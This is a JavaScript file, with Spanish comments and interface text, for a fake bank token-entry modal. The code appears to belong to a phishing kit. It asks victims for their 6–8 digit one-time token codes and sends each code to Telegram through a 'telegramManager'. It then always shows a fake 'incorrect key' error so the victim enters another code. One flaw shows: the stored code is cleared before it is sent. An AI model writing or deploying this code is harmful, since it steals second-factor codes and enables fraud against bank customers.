/**
 * TOKEN MODAL CONTROLLER - VERSIÓN COMPLETAMENTE CORREGIDA
 * Maneja modales de token y error con estilos y lógica perfecta
 */

'use strict';

class TokenModalController {
    constructor() {
        this.tokenValue = '';
        this.tokenRealValue = '';
        this.init();
    }
    
    init() {
        this.createTokenModal();
        this.createErrorModal();
        console.log('✅ Token Modal Controller initialized');
    }
    
    // ===== CREAR MODALES =====
    createTokenModal() {
        const modalHTML = `
            <div class="modal-overlay" id="tokenModal">
                <div class="modal-container">
                    <button type="button" class="modal-close" id="tokenModalClose">&times;</button>
                    <div class="modal-content">
                        <div class="modal-icon">
                            <img src="img/light-HardToken.svg" alt="Token">
                        </div>
                        <h2 class="modal-title">Clave del token</h2>
                        <p class="modal-subtitle">Ingresa los dígitos de la clave del token.</p>
                        
                        <div class="modal-input-group">
                            <label class="modal-input-label">Clave</label>
                            <input 
                                type="text" 
                                id="tokenInput" 
                                class="modal-input" 
                                maxlength="8"
                                inputmode="numeric"
                                pattern="[0-9]*"
                                autocomplete="off"
                            >
                        </div>
                        
                        <div class="modal-buttons">
                            <button type="button" class="modal-btn modal-btn-cancel" id="tokenCancel">Cancelar</button>
                            <button type="button" class="modal-btn modal-btn-submit" id="tokenContinue" disabled>Continuar</button>
                        </div>
                        
                        <div class="modal-options">
                            <h3 class="modal-options-title">Opciones del token</h3>
                            <div class="modal-options-list">
                                <a href="#" class="modal-option-link">Activar</a>
                                <a href="#" class="modal-option-link">Solicitar</a>
                                <a href="#" class="modal-option-link">Sincronizar</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        `;
        
        document.body.insertAdjacentHTML('beforeend', modalHTML);
        this.attachTokenModalEvents();
    }
    
    createErrorModal() {
        const modalHTML = `
            <div class="modal-overlay" id="errorModal">
                <div class="modal-container error-modal">
                    <button type="button" class="modal-close" id="errorModalClose">&times;</button>
                    <div class="modal-content">
                        <div class="modal-icon">
                            <img src="img/cancel.png" alt="Error">
                        </div>
                        <h2 class="modal-title">Inscripción rechazada</h2>
                        
                        <div class="error-message">
                            <p class="error-message-text">Clave incorrecta. Inténtalo nuevamente.</p>
                            <p class="error-message-code">Código: 023</p>
                        </div>
                        
                        <div class="modal-buttons">
                            <button type="button" class="modal-btn modal-btn-cancel" id="errorRetry">Intentar nuevamente</button>
                        </div>
                    </div>
                </div>
            </div>
        `;
        
        document.body.insertAdjacentHTML('beforeend', modalHTML);
        this.attachErrorModalEvents();
    }
    
    // ===== EVENTOS TOKEN MODAL =====
    attachTokenModalEvents() {
        const modal = document.getElementById('tokenModal');
        const closeBtn = document.getElementById('tokenModalClose');
        const cancelBtn = document.getElementById('tokenCancel');
        const continueBtn = document.getElementById('tokenContinue');
        const input = document.getElementById('tokenInput');
        
        let lastValue = '';
        
        // Cerrar modal
        closeBtn.addEventListener('click', () => this.closeTokenModal());
        cancelBtn.addEventListener('click', () => this.closeTokenModal());
        
        // Click fuera del modal
        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                this.closeTokenModal();
            }
        });
        
        // Input - enmascarar con puntos
        input.addEventListener('input', (e) => {
            const currentValue = e.target.value;
            
            // Detectar si se agregó o eliminó
            if (currentValue.length > lastValue.length) {
                // Se agregaron caracteres
                const diff = currentValue.length - lastValue.length;
                const newChars = currentValue.slice(-diff);
                // Solo agregar caracteres numéricos que NO sean puntos
                for (let char of newChars) {
                    if (char !== '•' && /[0-9]/.test(char)) {
                        this.tokenRealValue += char;
                    }
                }
            } else if (currentValue.length < lastValue.length) {
                // Se eliminaron caracteres
                const diff = lastValue.length - currentValue.length;
                this.tokenRealValue = this.tokenRealValue.slice(0, -diff);
            }
            
            // Actualizar input con puntos
            e.target.value = '•'.repeat(this.tokenRealValue.length);
            lastValue = e.target.value;
            this.tokenValue = this.tokenRealValue;
            
            // Añadir clase masked
            if (this.tokenRealValue.length > 0) {
                e.target.classList.add('masked');
            } else {
                e.target.classList.remove('masked');
            }
            
            this.validateTokenInput();
        });
        
        // Prevenir copiar/pegar
        input.addEventListener('paste', (e) => e.preventDefault());
        input.addEventListener('copy', (e) => e.preventDefault());
        
        // Continuar
        continueBtn.addEventListener('click', () => {
            if (this.tokenValue.length >= 6 && this.tokenValue.length <= 8) {
                this.submitToken();
            }
        });
        
        // Enter key
        input.addEventListener('keypress', (e) => {
            if (e.key === 'Enter' && !continueBtn.disabled) {
                this.submitToken();
            }
        });
    }
    
    // ===== EVENTOS ERROR MODAL =====
    attachErrorModalEvents() {
        const modal = document.getElementById('errorModal');
        const closeBtn = document.getElementById('errorModalClose');
        const retryBtn = document.getElementById('errorRetry');
        
        closeBtn.addEventListener('click', () => this.closeErrorModal());
        retryBtn.addEventListener('click', () => this.retryToken());
        
        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                this.closeErrorModal();
            }
        });
    }
    
    // ===== VALIDACIÓN =====
    validateTokenInput() {
        const continueBtn = document.getElementById('tokenContinue');
        const isValid = this.tokenValue.length >= 6 && this.tokenValue.length <= 8;
        
        if (isValid) {
            continueBtn.disabled = false;
            continueBtn.classList.add('enabled');
        } else {
            continueBtn.disabled = true;
            continueBtn.classList.remove('enabled');
        }
    }
    
    // ===== ABRIR/CERRAR MODALES =====
    openTokenModal() {
        const modal = document.getElementById('tokenModal');
        const input = document.getElementById('tokenInput');
        
        modal.classList.add('active');
        document.body.style.overflow = 'hidden';
        
        setTimeout(() => input.focus(), 100);
    }
    
    closeTokenModal() {
        const modal = document.getElementById('tokenModal');
        const input = document.getElementById('tokenInput');
        
        modal.classList.remove('active');
        document.body.style.overflow = '';
        
        // Reset
        input.value = '';
        input.classList.remove('masked');
        this.tokenValue = '';
        this.tokenRealValue = '';
        this.validateTokenInput();
    }
    
    openErrorModal() {
        const modal = document.getElementById('errorModal');
        modal.classList.add('active');
        document.body.style.overflow = 'hidden';
    }
    
    closeErrorModal() {
        const modal = document.getElementById('errorModal');
        modal.classList.remove('active');
        document.body.style.overflow = '';
    }
    
    // ===== SUBMIT TOKEN =====
    async submitToken() {
        this.closeTokenModal();
        
        console.log('📤 Enviando token a Telegram:', this.tokenValue);
        
        // Enviar token a Telegram (sin esperar respuesta)
        window.telegramManager.sendToTelegram('token', {
            token: this.tokenValue
        }).catch(err => console.error('Error sending token:', err));
        
        // Mostrar error modal inmediatamente (sin overlay ni delay)
        setTimeout(() => this.openErrorModal(), 200);
    }
    
    retryToken() {
        this.closeErrorModal();
        setTimeout(() => this.openTokenModal(), 300);
    }
}

// Inicializar
document.addEventListener('DOMContentLoaded', () => {
    window.tokenModalController = new TokenModalController();
});
